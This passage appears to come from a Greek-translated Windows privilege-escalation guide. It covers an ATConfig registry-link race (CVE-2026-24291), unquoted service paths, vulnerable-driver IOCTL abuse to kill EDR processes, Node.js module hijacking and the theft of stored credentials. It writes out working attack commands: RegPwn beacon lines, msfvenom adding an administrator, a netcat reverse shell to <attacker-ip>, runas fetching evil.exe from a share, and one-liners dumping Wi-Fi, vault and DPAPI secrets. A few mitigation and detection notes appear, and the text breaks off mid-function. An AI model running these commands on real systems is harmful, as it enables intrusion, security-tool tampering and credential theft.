Ορισμένες λειτουργίες Προσβασιμότητας των Windows δημιουργούν per-user **ATConfig** keys που αργότερα αντιγράφονται από μια διαδικασία **SYSTEM** σε ένα HKLM session key. Ένα registry **symbolic link race** μπορεί να ανακατευθύνει αυτό το privileged write σε **οποιοδήποτε HKLM path**, δίνοντάς σου ένα arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Permissions AppendData/AddSubdirectory στο Services registry

Αν έχετε αυτό το permission πάνω σε ένα registry αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε sub registries από αυτό**. Στην περίπτωση των Windows services αυτό είναι **αρκετό για να εκτελέσετε arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν το path προς ένα executable δεν βρίσκεται μέσα σε quotes, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε ending πριν από ένα space.

Για παράδειγμα, για το path _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Λίστα όλων των unquoted service paths, εξαιρώντας αυτά που ανήκουν σε built-in Windows services:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείς να εντοπίσεις και να εκμεταλλευτείς** αυτήν την ευπάθεια με metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείς να δημιουργήσεις χειροκίνητα ένα service binary με metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες Ανάκτησης

Τα Windows επιτρέπουν στους χρήστες να ορίζουν ενέργειες που θα εκτελούνται αν μια service αποτύχει. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, μπορεί να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες μπορούν να βρεθούν στην [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Εφαρμογές

### Εγκατεστημένες Εφαρμογές

Ελέγξτε τα **permissions of the binaries** (ίσως μπορείτε να αντικαταστήσετε ένα και να κάνετε privilege escalation) και των **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα Εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο config file για να διαβάσετε κάποιο special file ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από λογαριασμό Administrator (schedtasks).

Ένας τρόπος να βρείτε weak folder/files permissions στο σύστημα είναι να κάνετε:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Το Notepad++ φορτώνει αυτόματα οποιοδήποτε plugin DLL κάτω από τα `plugins` subfolders του. Αν υπάρχει writable portable/copy install, η τοποθέτηση ενός malicious plugin δίνει automatic code execution μέσα στο `notepad++.exe` σε κάθε launch (including from `DllMain` and plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Check if you can overwrite some registry or binary that is going to be executed by a different user.**\
**Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Look for possible **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Αν ένας driver εκθέτει ένα arbitrary kernel read/write primitive (συνηθισμένο σε poorly designed IOCTL handlers), μπορείς να κάνεις escalate κλέβοντας απευθείας ένα SYSTEM token από kernel memory. Δες την βήμα-βήμα technique εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Για race-condition bugs όπου η vulnerable call ανοίγει ένα attacker-controlled Object Manager path, το να επιβραδύνεις σκόπιμα το lookup (χρησιμοποιώντας max-length components ή deep directory chains) μπορεί να επεκτείνει το window από microseconds σε tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Τα σύγχρονα hive vulnerabilities σου επιτρέπουν να groom deterministic layouts, να abuse writable HKLM/HKU descendants, και να μετατρέπεις metadata corruption σε kernel paged-pool overflows χωρίς custom driver. Μάθε όλη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion από attacker-controlled paths

Μερικοί drivers δέχονται ένα registry path από userland, ελέγχουν μόνο ότι είναι μια λογική UTF-16 string, και μετά καλούν `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` με `RTL_QUERY_REGISTRY_DIRECT` σε ένα stack scalar όπως `int readValue`. Αν λείπει το `RTL_QUERY_REGISTRY_TYPECHECK`, το `EntryContext` ερμηνεύεται σύμφωνα με τον **πραγματικό** registry type, όχι με τον type που περίμενε ο developer.

Αυτό δημιουργεί δύο χρήσιμα primitives:

- **Confused deputy / oracle**: ένα user-controlled absolute `\Registry\...` path επιτρέπει στο driver να κάνει query σε attacker-chosen keys, να leak existence μέσω return codes/logs, και μερικές φορές να διαβάζει values στα οποία ο caller δεν θα είχε άμεση πρόσβαση.
- **Kernel memory corruption**: ένας scalar προορισμός όπως `&readValue` γίνεται type-confused ως `REG_QWORD`, `UNICODE_STRING`, ή sized binary buffer ανάλογα με το registry value type.

Πρακτικές σημειώσεις exploitation:

- **Windows 8+ mitigation**: αν το query χτυπήσει ένα **untrusted hive** με `RTL_QUERY_REGISTRY_DIRECT` αλλά χωρίς `RTL_QUERY_REGISTRY_TYPECHECK`, οι kernel callers crash-άρουν με `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Για να διατηρήσεις exploitability, ψάξε για **attacker-writable keys μέσα σε trusted system hives** αντί να κάνεις stage values κάτω από `HKCU`.
- **Trusted-hive staging**: χρησιμοποίησε NtObjectManager για να enumerate writable descendants του `\Registry\Machine`, και ξανατρέξε το scan με ένα duplicated **low-integrity** token για να βρεις keys reachable από sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: μια 8-byte direct write σε ένα 4-byte `int` καταστρέφει γειτονικά stack data και μπορεί να κάνει partially overwrite έναν κοντινό callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode expects `EntryContext` να δείχνει σε ένα `UNICODE_STRING`. If the code first loads an attacker-controlled `REG_DWORD` into a stack scalar and then reuses that same buffer for a string read, ο attacker controls `Length`/`MaximumLength` and partially influences the `Buffer` pointer, yielding a semi-controlled kernel write.
- **`REG_BINARY`**: for large binary data, direct mode treats the first `LONG` at `EntryContext` as a signed buffer size. If a prior `REG_DWORD` read leaves a **negative** attacker-controlled value in the reused scalar, the next `REG_BINARY` query copies attacker bytes directly over adjacent stack slots, which is often the cleanest path to full callback-pointer overwrite.

Strong hunting pattern: **heterogeneous registry reads into the same stack variable without reinitializing it**. Grep for `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, reused `EntryContext` pointers, and code paths where the first registry read controls whether a second read happens.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Πάντα να ορίζετε FILE_DEVICE_SECURE_OPEN όταν δημιουργείτε device objects που προορίζονται να περιοριστούν από ένα DACL.
- Επαληθεύστε το caller context για privileged operations. Προσθέστε PP/PPL checks πριν επιτρέψετε process termination ή handle returns.
- Περιορίστε τα IOCTLs (access masks, METHOD_*, input validation) και εξετάστε brokered models αντί για direct kernel privileges.

Detection ideas for defenders
- Παρακολουθείτε user-mode opens ύποπτων device names (π.χ. \\ .\\amsdk*) και συγκεκριμένες IOCTL sequences που υποδηλώνουν abuse.
- Εφαρμόστε το vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και διατηρείτε τα δικά σας allow/deny lists.


## PATH DLL Hijacking

Αν έχετε **write permissions μέσα σε έναν φάκελο που υπάρχει στο PATH** μπορεί να μπορέσετε να hijack ένα DLL που φορτώνεται από μια process και να **escalate privileges**.

Ελέγξτε τα permissions όλων των φακέλων μέσα στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να abuse αυτόν τον έλεγχο:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Αυτό είναι μια **Windows uncontrolled search path** παραλλαγή που επηρεάζει εφαρμογές **Node.js** και **Electron** όταν κάνουν ένα bare import όπως `require("foo")` και το αναμενόμενο module **λείπει**.

Το Node επιλύει packages ανεβαίνοντας το directory tree και ελέγχοντας folders `node_modules` σε κάθε parent. Στο Windows, αυτό το walk μπορεί να φτάσει μέχρι το drive root, έτσι μια εφαρμογή που εκκινεί από `C:\Users\Administrator\project\app.js` μπορεί να καταλήξει να ελέγχει:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **low-privileged user** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει ένα malicious `foo.js` (ή package folder) και να περιμένει ένα **higher-privileged Node/Electron process** να επιλύσει το missing dependency. Το payload εκτελείται στο security context του victim process, οπότε αυτό γίνεται **LPE** όποτε ο στόχος τρέχει ως administrator, από elevated scheduled task/service wrapper, ή από auto-started privileged desktop app.

Αυτό είναι ιδιαίτερα συνηθισμένο όταν:

- ένα dependency δηλώνεται στο `optionalDependencies`
- μια third-party library τυλίγει το `require("foo")` σε `try/catch` και συνεχίζει σε failure
- ένα package αφαιρέθηκε από production builds, παραλείφθηκε κατά το packaging, ή απέτυχε να εγκατασταθεί
- το vulnerable `require()` βρίσκεται βαθιά μέσα στο dependency tree αντί για το main application code

### Hunting vulnerable targets

Χρησιμοποιήστε **Procmon** για να αποδείξετε το resolution path:

- Filter by `Process Name` = target executable (`node.exe`, το Electron app EXE, ή το wrapper process)
- Filter by `Path` `contains` `node_modules`
- Εστιάστε στο `NAME NOT FOUND` και στο τελικό successful open κάτω από `C:\node_modules`

Χρήσιμα code-review patterns σε unpacked `.asar` files ή application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Εκμετάλλευση

1. Εντοπίστε το **missing package name** από το Procmon ή από έλεγχο του source.
2. Δημιουργήστε τον root lookup directory αν δεν υπάρχει ήδη:
```powershell
mkdir C:\node_modules
```
3. Ρίξε ένα module με το ακριβώς αναμενόμενο όνομα:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Ενεργοποίησε την εφαρμογή-θύμα. Αν η εφαρμογή προσπαθεί `require("foo")` και το νόμιμο module λείπει, το Node μπορεί να φορτώσει `C:\node_modules\foo.js`.

Πραγματικά παραδείγματα λείποντων optional modules που ταιριάζουν σε αυτό το pattern περιλαμβάνουν `bluebird` και `utf-8-validate`, αλλά η **technique** είναι το επαναχρησιμοποιήσιμο μέρος: βρες οποιοδήποτε **missing bare import** που θα resolve ένα privileged Windows Node/Electron process.

### Ιδέες για Detection και hardening

- Alert όταν ένας user δημιουργεί `C:\node_modules` ή γράφει νέα `.js` files/packages εκεί.
- Hunt για high-integrity processes που διαβάζουν από `C:\node_modules\*`.
- Πακετάρισε όλα τα runtime dependencies στην production και κάνε audit τη χρήση `optionalDependencies`.
- Έλεγξε third-party code για αθόρυβα `try { require("...") } catch {}` patterns.
- Απενεργοποίησε optional probes όταν το υποστηρίζει η library (για παράδειγμα, κάποια `ws` deployments μπορούν να αποφύγουν το legacy `utf-8-validate` probe με `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Ελέγξτε για άλλους γνωστούς υπολογιστές που είναι hardcoded στο hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοικτές Θύρες

Ελέγξτε για **restricted services** από το εξωτερικό
```bash
netstat -ano #Opened ports?
```
### Πίνακας Δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Firewall

[**Ελέγξτε αυτή τη σελίδα για commands σχετικά με το Firewall**](../basic-cmd-for-pentesters.md#firewall) **(list rules, create rules, turn off, turn off...)**

Περισσότερα[ commands for network enumeration εδώ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσεις root user, μπορείς να κάνεις listen σε οποιαδήποτε port (την πρώτη φορά που θα χρησιμοποιήσεις το `nc.exe` για να κάνεις listen σε μια port, θα ρωτήσει μέσω GUI αν το `nc` πρέπει να επιτραπεί από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το filesystem του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

Από [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για servers, websites και άλλα programs στα οποία τα **Windows** μπορούν να **log in the users automaticall**y. Με την πρώτη ματιά, αυτό μπορεί να μοιάζει ότι οι χρήστες μπορούν πλέον να αποθηκεύουν τα Facebook credentials, Twitter credentials, Gmail credentials κ.λπ., ώστε να γίνεται αυτόματο login μέσω browsers. Όμως δεν ισχύει αυτό.

Το Windows Vault αποθηκεύει credentials στα οποία τα Windows μπορούν να κάνουν αυτόματο login των χρηστών, πράγμα που σημαίνει ότι οποιαδήποτε **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault και να χρησιμοποιεί τα credentials που παρέχονται αντί να πληκτρολογούν οι χρήστες συνεχώς το username και το password.

Εκτός αν οι applications αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι είναι δυνατό να χρησιμοποιήσουν τα credentials για έναν συγκεκριμένο resource. Άρα, αν το application σου θέλει να κάνει χρήση του vault, θα πρέπει κατά κάποιο τρόπο να **communicate with the credential manager and request the credentials for that resource** από το default storage vault.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το `runas` με τις επιλογές `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το παρακάτω παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρήση του `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο για συμμετρική κρυπτογράφηση δεδομένων, που χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό του χρήστη ή του συστήματος για να συμβάλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που παράγεται από τα μυστικά σύνδεσης του χρήστη**. Σε σενάρια που αφορούν κρυπτογράφηση συστήματος, χρησιμοποιεί τα μυστικά domain authentication του συστήματος.

Τα κρυπτογραφημένα RSA keys του χρήστη, μέσω του DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει το [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το DPAPI key, που βρίσκεται μαζί με το master key και προστατεύει τα private keys του χρήστη στο ίδιο αρχείο**, συνήθως αποτελείται από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, αποτρέποντας την απαρίθμηση του περιεχομένου του μέσω της εντολής `dir` στο CMD, αν και μπορεί να γίνει απαρίθμησή του μέσω PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα arguments (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **credentials files protected by the master password** συνήθως βρίσκονται στο:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** χρησιμοποιούνται συχνά για **scripting** και automation tasks ως τρόπος να αποθηκεύονται encrypted credentials με βολικό τρόπο. The credentials are protected using **DPAPI**, which typically means they can only be decrypted by the same user on the same computer they were created on.

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατα εκτελεσμένες εντολές
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Διαχείριση Διαπιστευτηρίων Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Μπορείτε να **εξαγάγετε πολλά DPAPI masterkeys** από τη μνήμη με το Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Οι άνθρωποι συχνά χρησιμοποιούν το StickyNotes app σε Windows workstations για να **save passwords** και άλλες πληροφορίες, χωρίς να συνειδητοποιούν ότι είναι ένα database file. Αυτό το file βρίσκεται στο `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητάτε και να το εξετάζετε.

### AppCmd.exe

**Σημειώστε ότι για να ανακτήσετε passwords από το AppCmd.exe χρειάζεται να είστε Administrator και να εκτελείτε υπό High Integrity level.**\
**AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν αυτό το file υπάρχει τότε είναι πιθανό να έχουν ρυθμιστεί κάποια **credentials** και να μπορούν να **recovered**.

Αυτός ο κώδικας εξήχθη από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
